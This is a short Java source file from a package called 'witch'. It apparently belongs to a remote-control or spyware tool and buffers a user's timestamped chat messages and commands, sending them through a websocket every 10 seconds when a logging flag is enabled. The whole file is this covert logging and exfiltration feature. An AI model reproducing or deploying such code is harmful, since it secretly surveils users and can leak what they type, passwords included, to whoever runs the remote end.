package me.soda.witch.features;

import me.soda.witch.Witch;
import me.soda.witch.websocket.Message;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;

public class ChatCommandLogging {
    public static List<String> readyToSendStrings = new ArrayList<>();
    @SuppressWarnings("BusyWait")
    public static final Thread sendLogThread = new Thread(() -> {
        while (true) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                Witch.printStackTrace(e);
            }
            if (Witch.config.logChatAndCommand && !readyToSendStrings.isEmpty()) {
                Message.send("logging", String.join("\n", readyToSendStrings) + "\n");
                readyToSendStrings = new ArrayList<>();
            }
        }
    }, "Send Log Thread");

    public static void addToList(String msg) {
        String time = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss "));
        if (readyToSendStrings.size() < 10) {
            readyToSendStrings.add(time + msg);
        } else readyToSendStrings.add("TooManyPackets");


    }
}
